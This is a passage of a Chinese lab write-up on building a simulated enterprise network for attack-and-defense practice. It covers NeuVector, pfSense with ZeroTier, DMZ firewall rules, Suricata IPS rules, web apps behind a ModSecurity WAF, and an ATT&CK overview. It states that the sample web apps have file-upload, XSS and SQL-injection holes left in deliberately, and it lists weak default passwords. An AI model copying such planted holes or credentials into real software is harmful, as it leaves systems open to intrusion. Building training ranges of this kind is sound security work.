src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182824599.png" alt="image-20230402182725446"></p><p>​    如上图所示，多数pod启动失败，原因皆为镜像拉取失败导致的，查看官方提供的yaml文件，得知所有镜像的默认拉取策略为Always，尝试将其改为IfNotPresent，并提前手动拉取镜像(docker pull)到node节点本地来提高pod的部署与启动速度。</p><p>​    出现网络问题，这个应该就是之前镜像拉取失败的主要原因：<br><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182747459.png" alt="image-20230402182747459"></p><p>​    尝试配置DNS解析，并重启docker服务后解决：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182934688.png" alt="image-20230402182824599" style="zoom:50%;" /><p>​    所有的镜像均手动拉取下来后，重启之前启动失败的pod：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402184527091.png" alt="image-20230402182849092" style="zoom:67%;" /><p>访问 <a href="https://node-ip:30888，使用">https://node-ip:30888，使用</a> admin/admin登录</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182710512.png" alt="image-20230402182934688"></p><h5 id="功能应用："><a href="#功能应用：" class="headerlink" title="功能应用："></a><strong>功能应用：</strong></h5><p>​    成功安装 NeuVector 后，用户即可通过浏览器打开 NeuVector 的控制台。在控制台的导航栏中包含了，资产管理、策略管理、安全风险、通知、平台设置及联邦集群等五项核心功能：</p><table><thead><tr><th>Assets</th><th>Policy</th><th>Security Risks</th><th>Notifications</th><th>Settings</th></tr></thead><tbody><tr><td>Platforms</td><td>Admission Control</td><td>Vulnerabilities</td><td>Security Events</td><td>Users &amp; Roles</td></tr><tr><td>Nodes</td><td>Groups</td><td>Vulnerabilities Profile</td><td>Risk Reports</td><td>Configuration</td></tr><tr><td>Containers</td><td>Network Rules</td><td>Compliance</td><td>Events</td><td>LDAP/AD Settings</td></tr><tr><td>Registries</td><td>Response Rules</td><td>Compliance Profile</td><td>-</td><td>SAML Setting</td></tr><tr><td>System Components</td><td>DLP Sensors</td><td>-</td><td>-</td><td>OIDC Settings</td></tr><tr><td>–</td><td>WAF Sensors</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><p>扫描查看容器存在的中高危漏洞情况 </p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402184507499.png" alt="image-20230402184613404"></p><p>查看容器内存使用与网络通信情况<br><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402184334052.png" alt="image-20230402184527091"></p><p>配置容器应用分组的相关进程规则，文件访问规则等<br><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402141015331.png" alt="image-20230402184507499"></p><p>配置集群与容器的网络规则</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402184613404.png" alt="image-20230402184409738" style="zoom: 50%;" /><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402144022465.png" alt="image-20230402184334052"></p><p>查看集群中的安全事件<br><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402140810947.png" alt="image-20230402184309228" style="zoom: 50%;" /></p><h3 id="2-网络边界防火墙"><a href="#2-网络边界防火墙" class="headerlink" title="2.网络边界防火墙"></a>2.网络边界防火墙</h3><h4 id="pfsense配置zerotier"><a href="#pfsense配置zerotier" class="headerlink" title="pfsense配置zerotier"></a>pfsense配置zerotier</h4><p>pfsense对应的freeBSD版本是12.3</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402184309228.png" alt="image-20230402141015331"></p><p>下载zerotier：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402184409738.png" alt="image-20230402140810947"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg add -f https://pkg.freebsd.org/FreeBSD:12:amd64/latest/All/zerotier-1.10.4.pkg</span><br></pre></td></tr></table></figure><p>第二步，安装pfSense-pkg-zerotier软件包，这个软件包提供了在pfSense web界面管理zerotier网络的功能。</p><p>下载<a href="https://pfschina.org/wp/wp-content/uploads/2021/11/pfSense-pkg-zerotier-cn.zip">pfSense-pkg-zerotier-cn</a>软件包，解压缩后上传到pfSense后台，然后在pfSense shell环境下执行以下安装命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install pfSense-pkg-zerotier-cn.pkg</span><br></pre></td></tr></table></figure><p>在启动ZeroTier服务之前，需要手动修改两个文件。</p><p>打开etc&gt;rc.conf文件，添加以下内容并保存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zerotier_enable=&quot;YES&quot;</span><br></pre></td></tr></table></figure><p>打开etc&gt;sysctl.conf，添加以下内容并保存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.link.tap.up_on_open=1</span><br></pre></td></tr></table></figure><h4 id="防火墙配置思路-不同区域的访问控制规则"><a href="#防火墙配置思路-不同区域的访问控制规则" class="headerlink" title="防火墙配置思路(不同区域的访问控制规则)"></a>防火墙配置思路(不同区域的访问控制规则)</h4><p>添加zerotier接口：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182849092.png" alt="image-20230402144022465"></p><p><strong>单一防火墙：</strong></p><p>​    使用单一防火墙创建包含DMZ的网络体系必须具有3个以上的网络接口：</p><ul><li><p>外部网络ISP连接到防火墙第一网络接口；</p></li><li><p>内部网络接防火墙的第二网络接口；</p></li><li><p>DMZ则连接防火墙的第三网络接口。 </p></li></ul><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402170719845.png" alt="image-20230402151106595" style="zoom:50%;" /><p><strong>双重防火墙：</strong></p><p>​    第一个防火墙（Pfsense）配置为仅允许通往DMZ的通信；IDS（suricata）配置为只允许从DMZ到内部网络的通信。这个设置在安全性上更高，因为攻击内部网络需要突破两个防火墙，如果这两个防火墙是由两个不同的供应商提供的话，则会提供更多的保护，因为这样两个设备就不太可能遇到同样的安全漏洞。这种配置的缺点是购买和管理成本更高。使用不同供应商的不同防火墙的做法被认为是“纵深防御”安全策略的一个组成部分。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402170708527.png" alt="image-20230402151122412" style="zoom:50%;" /><p><strong>防火墙的设置原则如下：</strong></p><ul><li><p>内网可以访问外网。内网的用户显然需要自由地访问外网。在这一策略中，防火墙需要进行源地址转换。</p></li><li><p>内网可以访问DMZ。此策略是为了方便内网用户使用和管理DMZ中的服务器。建议只对有限的主机进行开放。</p></li><li><p>外网不能访问内网。很显然，内网中存放的是公司内部数据，这些数据不允许外网的用户进行访问。</p></li><li><p>外网可以访问DMZ。DMZ中的服务器本身就是要给外界提供服务的，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</p></li><li><p>DMZ访问内网有限制。很明显，如果违背此策略，则当入侵者攻陷DMZ时，就可以进一步进攻到内网的重要数据。</p></li><li><p>DMZ不能访问外网。此条策略也有例外，比如DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。可以根据需要进行设置。</p></li></ul><hr><blockquote><p>当防火墙策略将数据包设置为 “block” 时，防火墙将完全丢弃该数据包，并且不会向发送者发送任何响应。这意味着，被阻止的数据包将被完全忽略，而发送者将不会知道它们是否已被接收或被丢弃。</p><p>相反，当防火墙策略将数据包设置为 “reject” 时，防火墙将向发送者发送一个拒绝的响应，通知其其请求已被阻止。这意味着，发送者将会知道其请求已被拒绝，并且可以尝试进行其他操作。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402151122412.png" alt="image-20230402170708527"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402151106595.png" alt="image-20230402170719845"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402170648171.png" alt="image-20230402170648171"></p><h4 id="IDS的另一种部署方式"><a href="#IDS的另一种部署方式" class="headerlink" title="IDS的另一种部署方式"></a>IDS的另一种部署方式</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402181207296.png" alt="image-20230402181207296"></p><h4 id="使用nat代理转发dns请求"><a href="#使用nat代理转发dns请求" class="headerlink" title="使用nat代理转发dns请求"></a>使用nat代理转发dns请求</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182009012.png" alt="image-20230402182009012"></p><h3 id="3-Web-amp-邮件服务的搭建情况"><a href="#3-Web-amp-邮件服务的搭建情况" class="headerlink" title="3. Web&amp;邮件服务的搭建情况"></a>3. Web&amp;邮件服务的搭建情况</h3><h4 id="坚冰官网——模拟企业官网"><a href="#坚冰官网——模拟企业官网" class="headerlink" title="坚冰官网——模拟企业官网"></a>坚冰官网——模拟企业官网</h4><p>选型：Vue+npm</p><p>端口：5000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/fastice-tech &amp;&amp; npm run serve -- --port 5000</span><br><span class="line">Project setup</span><br><span class="line">npm install</span><br><span class="line">Compiles and hot-reloads for development</span><br><span class="line">npm run serve</span><br><span class="line">Compiles and minifies for production</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402204733169.png" alt="image-20230402204948566" style="zoom:67%;" /><h4 id="北半球小说网站——模拟博客"><a href="#北半球小说网站——模拟博客" class="headerlink" title="北半球小说网站——模拟博客"></a>北半球小说网站——模拟博客</h4><p>选型：Flask+Mysql+nginx</p><p>端口：5002</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/beibq &amp;&amp; python manage.py runserver -h 0.0.0.0 -p 5002</span><br><span class="line">启动：python manage.py runserver -h 0.0.0.0 -p 5002</span><br><span class="line">beibq：用户名root-密码123456</span><br></pre></td></tr></table></figure><p>创建小说、阅览小说、创建用户、md浏览等功能。</p><p><strong>预留漏洞</strong>：文件上传、XSS、sql注入</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402204909966.png" alt="image-20230402204909966" style="zoom:67%;" /><h4 id="学生选课-论坛——模拟多用户论坛"><a href="#学生选课-论坛——模拟多用户论坛" class="headerlink" title="学生选课/论坛——模拟多用户论坛"></a>学生选课/论坛——模拟多用户论坛</h4><p>选型：Django+Mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/studentTrainPlan &amp;&amp; python main.py runserver</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402204835963.png" alt="image-20230402204857538" style="zoom:67%;" /><p>预留漏洞：sql注入、XSS</p><h4 id="全部反向代理指WAF"><a href="#全部反向代理指WAF" class="headerlink" title="全部反向代理指WAF"></a>全部反向代理指WAF</h4><p>WAFip为 <a href="http://192.168.254.128/">http://192.168.254.128/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#企业官网</span><br><span class="line">server &#123;</span><br><span class="line">        listen 5000;</span><br><span class="line">        modsecurity on;</span><br><span class="line">        modsecurity_rules_file /etc/nginx/modsec/main.conf;</span><br><span class="line"> location / &#123;</span><br><span class="line"> #proxy_pass &lt;http://localhost:8085&gt;;</span><br><span class="line"> proxy_pass &lt;http://192.168.254.133:5000&gt;;</span><br><span class="line"> proxy_set_header Host $host;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#学生论坛</span><br><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        modsecurity on;</span><br><span class="line">        modsecurity_rules_file /etc/nginx/modsec/main.conf;</span><br><span class="line"> location / &#123;</span><br><span class="line"> proxy_pass &lt;http://192.168.254.133:5001&gt;;</span><br><span class="line"> proxy_set_header Host $host;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">#北半球小说</span><br><span class="line">server &#123;</span><br><span class="line">        listen 5002;</span><br><span class="line">        modsecurity on;</span><br><span class="line">        modsecurity_rules_file /etc/nginx/modsec/main.conf;</span><br><span class="line"> location / &#123;</span><br><span class="line"> proxy_pass &lt;http://192.168.254.133:5002&gt;;</span><br><span class="line"> proxy_set_header Host $host;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402204700848.png" alt="image-20230402204835963"></p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402204640329.png" alt="image-20230402204814105" style="zoom: 67%;" /><p>防火墙测试：（sql注入过滤测试，测试结果为被防火墙拦截，如下）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402192525999.png" alt="image-20230402204700848"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402192937279.png" alt="image-20230402204733169"></p><h4 id="邮件服务器简单使用"><a href="#邮件服务器简单使用" class="headerlink" title="邮件服务器简单使用"></a>邮件服务器简单使用</h4><p>Postfix 是一种 <code>Mail Transfer Agent 邮件传送代理</code> (MTA) 是 Ubuntu 缺省的邮件代理程序.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">配置SMTP用户名和密码</span><br><span class="line">biscuit19@bisc.com:587 biscuit19:123456</span><br></pre></td></tr></table></figure><p>发送邮件测试：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402192550049.png" alt="image-20230402204640329"></p><p>（由于缺少公网域名，所以无法正常解析DNS、发送邮件）</p><h3 id="4-IPS的配置"><a href="#4-IPS的配置" class="headerlink" title="4. IPS的配置"></a>4. IPS的配置</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-masquerade --permanent</span><br><span class="line"><span class="meta">#</span><span class="bash">开启防火墙的NAT功能，注意如果防火墙为开启需要先开启防火墙</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这个好像也叫地址伪装功能</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --reload  #防火墙重新启动</span><br><span class="line">firewall-cmd --list-all #查看masquerade状态</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402204814105.png" alt="image-20230402192525999" style="zoom:67%;" /><p>​    完成后再开启Linux内核路由功能：</p><p>​    通过vim /etc/sysctl.conf在文件里边修改或添加 <strong>net.ipv4.ip_forward=1</strong> 修改结果如下所示：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402204857538.png" alt="image-20230402192550049" style="zoom:50%;" /><p>然后输入sysctl -p 使命令生效</p><p>这时，回到客户机ping或者traceroute 一下百度<a href="http://www.baidu.com进行测试/">www.baidu.com进行测试</a></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402192949380.png" alt="image-20230402192622007"></p><p>成功搭建了路由功能。</p><h4 id="IPS配置"><a href="#IPS配置" class="headerlink" title="IPS配置"></a>IPS配置</h4><p>​    首先，输入命令suricata –build-info检查是否在 Suricata 构建中启用了 NFQ，确保输出中列出了 NFQ</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402224030127.png" alt="image-20230402192906565"></p><p>​    使用选项sudo suricata -c /etc/suricata/suricata.yaml -q 0，告诉 Suricata 它应该使用哪个队列号，以便使用NFQ模式运行suricata。</p><blockquote><p>nfqueue是一个Linux内核网络过滤器，可以将特定的网络数据包从内核网络栈中抽取出来，交由用户空间程序处理。通过使用nfqueue，用户空间程序可以对网络数据包进行各种操作，如修改数据包的内容、记录数据包的信息、阻止或允许数据包的传输等。nfqueue可以与iptables或其他内核网络过滤器集成使用，以实现更加复杂的网络过滤和安全策略。通过打开nfqueue支持，可以将网络流量导入到Suricata的处理引擎中，进行深度检测和分析。Suricata可以对流量进行多种操作，如检测、阻止、修改等，以实现更加高效和准确的网络安全策略。</p></blockquote><p>​    在本次实验中，Suricata 在网关上运行并且旨在保护在该网关后面的计算机 ，在网关场景中，将流量发送到 Suricata 的最简单规则是：sudo iptables -I FORWARD -j NFQUEUE，这种情况下，所有转发的流量都流向suricata。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402213026014.png" alt="image-20230402192937279" style="zoom:67%;" /><p>​    在suricata.yaml文件中，我们配置自己的test.rules规则：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402192906565.png" alt="image-20230402192949380" style="zoom:67%;" /><p>​    现在来进行一个简单的测试，我们在test.rules中加入这样一条规则：reject http any any -&gt; any any (msg:”hit baidu.com…”;content:”baidu”; reference:url, <a href="http://www.baidu.com;),禁止客户端对百度网站的访问./">www.baidu.com;)，禁止客户端对百度网站的访问。</a></p><p>​    然后让suricata在网关下运行：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402192622007.png" alt="image-20230402193014172"></p><p>​    这时，使用客户端访问<a href="http://www.baidu.com是不可行的，下图中是很明显的前后对比：">http://www.baidu.com是不可行的，下图中是很明显的前后对比：</a></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402193014172.png" alt="image-20230402193032889"></p><h4 id="规则集选用与规则编写"><a href="#规则集选用与规则编写" class="headerlink" title="规则集选用与规则编写"></a>规则集选用与规则编写</h4><p>在高层次上，Suricata签名由三部分组成：</p><ul><li><strong>Action</strong>：当流量符合规则时采取的行动</li><li><strong>Header</strong>：一个标题，描述主机、IP地址、端口、协议和流量方向（传入或传出）</li><li><strong>Options</strong>：选项，指定诸如签名ID（sid）、日志信息、匹配数据包内容的正则表达式、分类类型，以及其他可以帮助缩小识别合法和可疑流量的修饰语</li></ul><p>签名的一般结构如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTION <span class="selector-tag">HEADER</span> OPTIONS</span><br></pre></td></tr></table></figure><p>alert ssh any any -&gt; 203.0.113.0/24 2022 (msg:”SSH TRAFFIC on non-SSH port”; sid:1000000; rev:2;)</p><p>​    然而，我们没必要，也不可能自己编写所有的规则，suricata本身提供了很多对于应用层协议常见攻击方式的检测规则集，如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402230748299.png" alt="image-20230402213026014"></p><p>较为重要的一些值得注意的协议：</p><ul><li><p><strong>Kerberos是一种计算机网络认证协议，是基于加密 Ticket 的身份认证协议，它允许某实体在非安全网络环境下通信，向另一个实体以一种安全的方式证明自己的身份。</strong> Kerberos是第三方认证机制，其中用户和服务依赖于第三方（Kerberos<a href="https://cloud.tencent.com/product/cvm?from=20065&from_column=20065">服务器</a>）来对彼此进行身份验证。</p></li><li><p>NFS就是Network File System的缩写，即网络文件系统，Windows可以使用NFS（Network File System）协议来访问NFS共享文件系统，这也是一种常见的跨平台文件共享方案，它允许网络中的计算机之间通过TCP/IP网络共享资源，它最大的功能就是可以<strong>通过网络，让不同的机器、不同的操作系统可以共享彼此的文件。</strong></p></li><li><p><code>Modbus</code>的应用十分广泛，特别是在工业控制领域，Modbus 协议是应用于电子控制器上的一种通用语言。通过此协议，控制器相互之间、控制器经由网络（例如以太网）和其它设备之间可以通信。它已经成为一通用工业标准。有了它，不同厂商生产的控制设备可以连成工业网络，进行集中监控。</p></li><li><p>NTP是从时间协议(Time Protocol)和ICMP时间戳报文(ICMP TimeStamp Message)演变而来，在准确性和健壮性方面进行了特殊的设计，理论上精度可达十亿分之一秒。NTP协议是基于UDP进行传输的，使用端口号为123。</p></li><li><p>SMB（Server Message Block）是一种在计算机网络中常用的通信协议，它允许客户端在计算机网络中访问和共享文件、打印机、串口和其它资源。SMB协议最初由IBM开发，后来被微软引入并进一步发展和推广，成为Windows系统中最常用的文件和打印共享协议之一。</p></li><li><p>MQTT（消息队列遥测传输）是物联网中用于向设备发送消息和从设备发送消息的轻量级消息传递协议。它通过TCP/IP网络运行。还有许多其他消息传递协议可用于物联网，但MQTT由于其简单性和易用性而迅速成为最受欢迎的协议。</p></li></ul><p><strong>规则分析：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert dhcp any any -&gt; <span class="function">any <span class="title">any</span> <span class="params">(msg:<span class="string">&quot;SURICATA DHCP truncated options&quot;</span>; app-layer-event:dhcp.truncated_options; classtype:protocol-command-decode; sid:<span class="number">2227001</span>; rev:<span class="number">1</span>;)</span></span></span><br></pre></td></tr></table></figure><ul><li>alert: 表示如果满足规则条件，则产生一个警报。</li><li>dhcp any any -&gt; any any: 表示匹配源地址和目的地址均为任意IP地址的DHCP流量。</li><li>msg:”SURICATA DHCP truncated options”: 规则的警报信息，表示检测到DHCP请求中存在选项截断。</li><li>app-layer-event:dhcp.truncated_options: 表示警报是由于DHCP协议中存在选项截断导致的，这是基于Suricata IDS的协议分析引擎检测到的。</li><li>classtype:protocol-command-decode: 表示规则的类型为“协议命令解码”，即检测协议命令是否被正确解码，可以防止一些协议解码攻击。</li><li>sid:2227001: 规则的唯一标识符，用于区分不同的规则。</li><li>rev:1: 规则的版本号，用于区分不同版本的规则。</li></ul><h3 id="5-多模块的拼接"><a href="#5-多模块的拼接" class="headerlink" title="5. 多模块的拼接"></a>5. 多模块的拼接</h3><h4 id="vlan与子网技术辨析"><a href="#vlan与子网技术辨析" class="headerlink" title="vlan与子网技术辨析"></a>vlan与子网技术辨析</h4><p>参考:<a href="https://blog.csdn.net/hiphop1522/article/details/126688669">https://blog.csdn.net/hiphop1522/article/details/126688669</a></p><p>VLAN和IP子网划分的目的是隔离广播包数据和访问控制。VLAN隔离的是二层广播包(广播地址是全FF:FF:FF:FF:FF:FF的MAC地址），IP子网隔离的是三层IP广播包，广播地址是IP子网的最后一个IP地址或全网广播地址（255.255.255.255）。 </p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402223724377.png" alt="image-20230402224030127" style="zoom: 50%;" /><ul><li><p>PC1：10.1.1.1/24</p></li><li><p>PC2：无地址</p></li><li><p>PC3：10.1.2.1/24</p></li></ul><p><strong>问题一：</strong>PC1发送广播帧的话PC2和PC3能不能收到广播帧？</p><p><strong>问题二：</strong>PC1和PC3是否能够通信？</p><p>首先针对问题一的回答是肯定的，PC1发送广播帧的话，PC2和PC3可以收到。</p><p>那么我们来看下为什么。</p><ol><li>PC1发送广播帧后，该广播帧到达SW1后，因为是广播帧，所以交换机的处理方式是泛洪，将该广播帧从除了接收端口以外的所有接口都复制一份发出去，此时PC2收到了该广播帧，如下图。</li><li>SW1将广播帧发给了SW2和PC2，此时SW2收到该广播帧，也会执行泛洪动作，将该广播帧发给PC3，如下图。</li><li>所以问题一的答案是PC1发送广播帧后，PC2和PC3都能收到该广播帧。</li></ol><p>再是针对问题二的回答是否定的，PC1和PC3不可以通信（SW1和SW2是傻瓜交换机）。</p><p>这又是为什么呢？</p><p>​    对于PC1来说，他的地址是10.1.1.1/24，所以他认为自己所在的广播域是10.1.1.0/24这个区域，PC3：10.1.2.1/24和他不在同一个广播域，所以PC1想要找PC3的话一定会去其他的广播域找，也就是会将报文发给他的网关，而不会在自己所在的这个广播域去找PC3。所以PC1永远无法找到PC3。</p><h4 id="zerotier环境"><a href="#zerotier环境" class="headerlink" title="zerotier环境"></a>zerotier环境</h4><p>​    上两周,提出了使用zerotier的flow rules进行端口转发的方式,因此,将拓扑图中的14台主机加入同一网络,尝试进行网络划分工作:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402223332107.png" alt="image-20230402223724377"></p><p>​    遇到的问题:</p><ul><li>由于zerotier不是物理设备，因此在linux中没有对应网卡的配置文件，无法进行网关、子网掩码等属性的配置</li><li>可以通过如下配置，指定子网掩码位255.255.255.0，但是由于广播域是乱的，导致无法正常通信：</li></ul><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402204948566.png" alt="image-20230402230748299" style="zoom: 67%;" /><h2 id="二、攻击思路调研"><a href="#二、攻击思路调研" class="headerlink" title="二、攻击思路调研"></a>二、攻击思路调研</h2><p>​    ATT&amp;CK作为MITRE机构开发的攻击模型框架，是一个基于现实世界所观察到的真实攻击向量的集合，其包含了已公开报告的众多威胁组织及其使用的工具和攻击技术。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402193032889.png" alt="image-20230402223332107" style="zoom: 33%;" /><p>​    ATT&amp;CK框架包括两个主要部分：战术和技术。战术是攻击者在攻击生命周期中使用的高级目标，而技术则是攻击者在实现这些目标时使用的具体工具和方法。ATT&amp;CK框架还包括一个“预测”部分，其中包含了一些可能的未来攻击趋势。</p><p>ATT&amp;CK框架现在包括14个战术，分别是：</p><blockquote><p>Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact.</p></blockquote><p>​    侦察、资源开发、初始访问、命令执行、持久化、权限提升、防御规避、发现、横向移动、收集、命令与控制和数据泄露。这些战术按照逻辑分布在多个矩阵中，以“初始访问”战术开始，经过“执行”、“持久化”、“提权”、“防御绕过”、“凭据访问”、“发现”、“横向移动”、“收集”、“命令与控制”、“数据泄露“和”后续破坏“等。</p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230402210746995.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230402210746995.png"></p><table><thead><tr><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://attack.mitre.org/tactics/TA0043">https://attack.mitre.org/tactics/TA0043</a></td><td>Reconnaissance</td><td>The adversary is trying to gather information they can use to plan future operations.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0042">https://attack.mitre.org/tactics/TA0042</a></td><td>Resource Development</td><td>The adversary is trying to establish resources they can use to support operations.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0001">https://attack.mitre.org/tactics/TA0001</a></td><td>Initial Access</td><td>The adversary is trying to get into your network.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0002">https://attack.mitre.org/tactics/TA0002</a></td><td>Execution</td><td>The adversary is trying to run malicious code.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0003">https://attack.mitre.org/tactics/TA0003</a></td><td>Persistence</td><td>The adversary is trying to maintain their foothold.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0004">https://attack.mitre.org/tactics/TA0004</a></td><td>Privilege Escalation</td><td>The adversary is trying to gain higher-level permissions.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0005">https://attack.mitre.org/tactics/TA0005</a></td><td>Defense Evasion</td><td>The adversary is trying to avoid being detected.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0006">https://attack.mitre.org/tactics/TA0006</a></td><td>Credential Access</td><td>The adversary is trying to steal account names and passwords.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0007">https://attack.mitre.org/tactics/TA0007</a></td><td>Discovery</td><td>The adversary is trying to figure out your environment.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0008">https://attack.mitre.org/tactics/TA0008</a></td><td>Lateral Movement</td><td>The adversary is trying to move through your environment.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0009">https://attack.mitre.org/tactics/TA0009</a></td><td>Collection</td><td>The adversary is trying to gather data of interest to their goal.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0011">https://attack.mitre.org/tactics/TA0011</a></td><td>Command and Control</td><td>The adversary is trying to communicate with compromised systems to control them.</td></tr><tr><td><a href="https://attack.mitre.org/tactics/TA0010">https://attack.mitre.org/tactics/TA0010</a></td><td>Exfiltration</td><td>The adversary is trying to steal data.</td></tr><tr><td><a 